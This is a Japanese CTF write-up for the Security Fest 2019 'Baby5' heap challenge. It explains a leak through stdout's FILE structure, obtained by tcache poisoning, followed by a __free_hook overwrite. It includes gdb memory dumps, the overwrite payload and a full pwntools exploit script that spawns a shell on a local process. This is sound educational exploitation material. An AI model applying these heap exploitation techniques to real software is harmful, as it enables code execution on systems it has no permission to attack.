---
tags: pwn
---

# Security Fest 2019 - Baby5 (showless leak)

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Advanced

HITCON 2018 - baby tcacheを始めとして世界にはshow機能が無い問題が幾らかあり、そろそろそれを習得したいと思って色々勉強してました。で、なんとなくやり方は掴んだのでひとまずPIE無効バイナリでshow機能を使わずにクリアしたのでその報告になります。

扱った問題は[Security Fest 2019 - Baby5](/1TjURyrER_G9xO-gf6s7ng)です。元問題がHeap入門者向けで、解法の自由度が高いので試してみるのにもちょうどよいです。

## Writeup

元問題と同じなのでchecksec, binaryは割愛、show機能は禁止(libc leakのassertionで使ったが普通に動いたのでコメントアウトした)

### Outline

PIE無効なので.bssセクションにある`stdout`というシンボルが存在しており、こいつは`_IO_File`構造体である`_IO_2_1_stdout_`を指している。よって`stdout`シンボルで示される先をtcache poisoningで確保してさらにもう一度mallocすると`_IO_2_1_stdout_`がチャンクとして得られ、書き込みをすることが出来る。
そこで`_flags`と`_IO_write_base`を書き換えて出力範囲を大きくし、次のprintfやputsが呼ばれた際にlibcからの距離が分かっている箇所をリークする。setbufでバッファリングが切られ、shortbufメンバが使われているのでshortbufよりちょっと上ぐらいから出力するようにすればちょうどよいアドレスが入っているので無事にリークできる。
というわけで後は[Security Fest 2019 - Baby5 (Unsorted Bin)](/8sk4smXMRPeHvORbrmH1Lw)と同様にsystemのアドレスをお好きなところに入れてシェルを起動する。あちらは`atoi`のGOT Overwriteだったが、慣れてしまったので`__free_hook`に入れた。

### stdoutを確保

ひとまず`_IO_2_1_stdout_`が弄れないことには何も始まらないのでこのとっかかりをを掴む。.bssセクションにある`stdout`シンボルはそこを指している上にPIE無効でアドレスもわかっているのでまずはここを確保する。
tcache poisoningでnextを`stdout`へ向けた様子が次の通り

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0xbba280 (size : 0x20d80) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x30)   tcache_entry[1](1): 0xbba260 --> 0x6020a0 --> 0x7f69e77ec760 --> 0xfbad2887 (invaild memory)
gdb-peda$ x/16gx 0x7f69e77ec760
0x7f69e77ec760 <_IO_2_1_stdout_>:       0x00000000fbad2887      0x00007f69e77ec7e3
0x7f69e77ec770 <_IO_2_1_stdout_+16>:    0x00007f69e77ec7e3      0x00007f69e77ec7e3
0x7f69e77ec780 <_IO_2_1_stdout_+32>:    0x00007f69e77ec7e3      0x00007f69e77ec7e3
0x7f69e77ec790 <_IO_2_1_stdout_+48>:    0x00007f69e77ec7e3      0x00007f69e77ec7e3
0x7f69e77ec7a0 <_IO_2_1_stdout_+64>:    0x00007f69e77ec7e4      0x0000000000000000
0x7f69e77ec7b0 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
0x7f69e77ec7c0 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007f69e77eba00
0x7f69e77ec7d0 <_IO_2_1_stdout_+112>:   0x0000000000000001      0xffffffffffffffff
gdb-peda$ 
```

サイズ0x30のtcacheの2番目にstdoutが来ており、これは`_IO_2_1_stdout_`を指していることが分かる。
よって、ここで2回mallocすれば`stdout`を指すポインタを得ることが出来、更にもう1度mallocすれば`_IO_2_1_stdout_`を指すポインタが得られる。

なお、add時に1バイトは書き込むようにしているので`stdout`を確保する時に`_IO_2_1_stdout_`を指しているポインタを破壊してしまう可能性がある。tcache内のリンクリストには影響が無いが、出力で影響があるおそれがあるので事前に末尾1バイトを調べてそれを付与している(ASLR, PIE有効化(今回は無効だが)でもlibcの配置中の末尾1バイトは実質固定であることを利用した)、上のデバッガの出力を見ればわかるように単純に0x60を送れば良い。

ちなみに最初0x60に続けて改行を付与していたことに気付かず、SIGSEGVを連発して発狂した。

### stdoutを弄る

さて無事に`_IO_2_1_stdout_`を書き換えることが出来そうなので出力に関わるメンバを書き換えてしまう。ここで`_IO_FILE`構造体の定義を見ると次のようになっている。

```c
struct _IO_FILE
{
  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;        /* Current read pointer */
  char *_IO_read_end;        /* End of get area. */
  char *_IO_read_base;        /* Start of putback+get area. */
  char *_IO_write_base;        /* Start of put area. */
  char *_IO_write_ptr;        /* Current put pointer. */
  char *_IO_write_end;        /* End of put area. */
  char *_IO_buf_base;        /* Start of reserve area. */
  char *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

※おおよそ参考文献1のコピペになってしまうので軽く述べるに留まる

まずはフラグだが、ここは上位4バイトがマジックナンバーで残りがフラグとなっている。詳しい意味はまたそのうち述べるとして(というか俺もよくわかっとらん)ここでは`0xfbad1880`を採用した
`_IO_read_`系のポインタは特に使わないので0で潰してしまう。書き換えたいのはその下の`_IO_write_base`である

stdoutは出力時にwriteを使うので`_IO_write_base`, `_IO_write_ptr`辺りを書き換えることで出力範囲を操作することが出来る。ここでは`_IO_write_base`の下位1バイトを小さい方向へ書き換えることで想定より広い範囲での出力を狙う(リトルエンディアンなので下位バイトだけを書き換えるのは容易な上に上位バイトを破壊することも無い)。
なお、この2つのポインタが出力にどう関わっているのかは各種参考文献を参考にして欲しい(ただのコピペになりそうなのと、1問だけのWriteupよりはわかりやすい資料を読んだ方が良いのと面倒だからです)、ひとまず`_IO_write_base`からこの2つの差分だけ表示されるという理解で話を進める。

先程の`_IO_2_1_stdout_`をもう少し覗いてみると次のようになっている。

```
gdb-peda$ x/32gx 0x7f69e77ec760
0x7f69e77ec760 <_IO_2_1_stdout_>:       0x00000000fbad2887      0x00007f69e77ec7e3
0x7f69e77ec770 <_IO_2_1_stdout_+16>:    0x00007f69e77ec7e3      0x00007f69e77ec7e3
0x7f69e77ec780 <_IO_2_1_stdout_+32>:    0x00007f69e77ec7e3      0x00007f69e77ec7e3
0x7f69e77ec790 <_IO_2_1_stdout_+48>:    0x00007f69e77ec7e3      0x00007f69e77ec7e3
0x7f69e77ec7a0 <_IO_2_1_stdout_+64>:    0x00007f69e77ec7e4      0x0000000000000000
0x7f69e77ec7b0 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
0x7f69e77ec7c0 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007f69e77eba00
0x7f69e77ec7d0 <_IO_2_1_stdout_+112>:   0x0000000000000001      0xffffffffffffffff
0x7f69e77ec7e0 <_IO_2_1_stdout_+128>:   0x000000000a000000      0x00007f69e77ed8c0
0x7f69e77ec7f0 <_IO_2_1_stdout_+144>:   0xffffffffffffffff      0x0000000000000000
0x7f69e77ec800 <_IO_2_1_stdout_+160>:   0x00007f69e77eb8c0      0x0000000000000000
0x7f69e77ec810 <_IO_2_1_stdout_+176>:   0x0000000000000000      0x0000000000000000
0x7f69e77ec820 <_IO_2_1_stdout_+192>:   0x00000000ffffffff      0x0000000000000000
0x7f69e77ec830 <_IO_2_1_stdout_+208>:   0x0000000000000000      0x00007f69e77e82a0
```

`_IO_write_base`と`_IO_write_ptr`にあたるのはどちらも`0x7f69e77ec7e3`であり、ここは`_shortbuf`メンバに相当する。出力後なので同じ値を示しているが、元は`_IO_write_ptr`がここから1バイト先にあったので`\x0a`(にあたる改行)が出力され、2つが同じ値となったことでこれ以上出力されなくなった。

ではこの`_IO_write_base`の下位バイトを小さい方向へ書き換えるとどうなるかというと`_IO_write_ptr`を書き換えなければ1バイトなんていうケチケチした単位では無くもっと大きい範囲で出力が出来る。
もう既に`_IO_2_1_stdout_`内にlibcを指すポインタは結構あるのでそれを利用しても良いのだが今回は更に上の方にある数字を利用した。下の図で`0x7f69e77ec708`にあたる箇所に入っている`0x7f69e77ed8b0`なんかは都合が良さそうなのでここを狙う。

```
gdb-peda$ x/32gx 0x7f69e77ec700
0x7f69e77ec700 <_IO_2_1_stderr_+128>:   0x0000000000000000      0x00007f69e77ed8b0
0x7f69e77ec710 <_IO_2_1_stderr_+144>:   0xffffffffffffffff      0x0000000000000000
0x7f69e77ec720 <_IO_2_1_stderr_+160>:   0x00007f69e77eb780      0x0000000000000000
0x7f69e77ec730 <_IO_2_1_stderr_+176>:   0x0000000000000000      0x0000000000000000
0x7f69e77ec740 <_IO_2_1_stderr_+192>:   0x0000000000000000      0x0000000000000000
0x7f69e77ec750 <_IO_2_1_stderr_+208>:   0x0000000000000000      0x00007f69e77e82a0
0x7f69e77ec760 <_IO_2_1_stdout_>:       0x00000000fbad2887      0x00007f69e77ec7e3
0x7f69e77ec770 <_IO_2_1_stdout_+16>:    0x00007f69e77ec7e3      0x00007f69e77ec7e3
0x7f69e77ec780 <_IO_2_1_stdout_+32>:    0x00007f69e77ec7e3      0x00007f69e77ec7e3
0x7f69e77ec790 <_IO_2_1_stdout_+48>:    0x00007f69e77ec7e3      0x00007f69e77ec7e3
0x7f69e77ec7a0 <_IO_2_1_stdout_+64>:    0x00007f69e77ec7e4      0x0000000000000000
0x7f69e77ec7b0 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
0x7f69e77ec7c0 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007f69e77eba00
0x7f69e77ec7d0 <_IO_2_1_stdout_+112>:   0x0000000000000001      0xffffffffffffffff
0x7f69e77ec7e0 <_IO_2_1_stdout_+128>:   0x000000000a000000      0x00007f69e77ed8c0
0x7f69e77ec7f0 <_IO_2_1_stdout_+144>:   0xffffffffffffffff      0x0000000000000000
gdb-peda$ 
```

事前にこの値とlibc配置アドレスとのオフセットを計算しておけばここがリークした時にlibc leakが出来る

というわけで`_IO_2_1_stdout_`へ書き込む時のペイロードは次のようになる。

```python
payload = p64(0xfbad1880) \
        + p64(0) \
        + p64(0) \
        + p64(0) \
        + b"\x08"
```

上から`_flags`, `_IO_read`系のポインタ(実質`_IO_write_base`までのパディング) × 3, `_IO_write_base`の下位バイト書き換えとなっている

これを書き込むと次の`puts`や`printf`で`0x7f69e77ec708`から`0x7f69e77ec7e4`までのメモリの中身が出力されるので最初の8バイトを受け取ってアンパックして先程のオフセットを引けばlibc leakが出来る

### いつもの

(これいる?)

Double Free経由のtcache poisoningで`__free_hook`をnextに配置し、確保時にsystemのアドレスを入れて`"/bin/sh"`が入っているチャンクをfreeしてシェルゲット

## Code

```python
from pwn import process, p64, u64, ELF


def _select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(sel)


def add(s, size, data=b"junk"):
    _select(s, b"1")
    s.recvuntil("size: ")
    s.sendline(str(size).encode())
    s.recvuntil("data: ")
    s.send(data)


def edit(s, idx, size, data):
    _select(s, b"2")
    s.recvuntil("item: ")
    s.sendline(str(idx).encode())
    s.recvuntil("size: ")
    s.sendline(str(size).encode())
    s.recvuntil("data: ")
    s.send(data)


def delete(s, idx):
    _select(s, b"3")
    s.recvuntil("item: ")
    s.sendline(str(idx).encode())


def show(s, idx):
    _select(s, b"4")
    s.recvuntil("item: ")
    s.sendline(str(idx).encode())
    s.recvuntil("data: ")
    return s.recvline().rstrip()


if __name__ == '__main__':
    elf = ELF("./baby5")
    stdout_elf = elf.symbols["stdout"]
    libc = ELF("./libc.so.6")  # 2.27
    system_libc = libc.symbols["system"]
    free_hook_libc = libc.symbols["__free_hook"]
    stdout_libc = libc.symbols["_IO_2_1_stdout_"]
    offset = 0x7fd8e6ded8b0 - 0x7fd8e6a00000

    s = process("./baby5")

    add(s, 0x28)  # 0
    delete(s, 0)
    delete(s, 0)
    add(s, 0x28, p64(stdout_elf))  # 1
    add(s, 0x28)  # 2
    add(s, 0x28, b"\x60")  # 3

    payload = p64(0xfbad1880) + p64(0) * 3 + b"\x08"
    add(s, 0x28, payload)  # 4

    libc_addr = u64(s.recv(6).ljust(8, b"\x00")) - offset

    print(hex(libc_addr))

    # assertion
    # libc_addr_check = u64(show(s, 3).ljust(8, b"\x00")) - stdout_libc
    # assert libc_addr == libc_addr_check

    add(s, 0x18)  # 5
    delete(s, 5)
    delete(s, 5)
    add(s, 0x18, p64(libc_addr + free_hook_libc))  # 6
    add(s, 0x18)  # 7
    add(s, 0x18, p64(libc_addr + system_libc))  # 8
    
    add(s, 0x18, b"/bin/sh\x00")  # 9
    delete(s, 9)

    s.interactive()
```

## Flag

ローカルでシェル取っただけ

## 感想

非常に高い壁だと思っていたshowless leakだがひとまず原理を実戦に落とし込むことが出来て嬉しかった。次は実際にshowlessとして出題された問題を解いてみたい(Unsorted Binで降ってきたfdとoverlapしたtcache中のチャンクのnextの下位バイトを書き換えてtcache poisoningするらしい、難しそう)。

## Special Thanks

shortbufについて色々と教えてくれた弊チームの低レイヤー担当のDronexくん

## 参考文献

1. [ヒープ系問題におけるstdout / stderrを利用したメモリリーク](https://ptr-yudai.hatenablog.com/entry/2019/05/31/235444)
2. [HITCON CTF: baby_tcache Writeup](https://vigneshsrao.github.io/babytcache/)
3. [【pwn8.2】 baby_tcache - HITCON CTF 2018: 無理やりの出力](https://smallkirby.hatenablog.com/entry/2019/09/27/201019)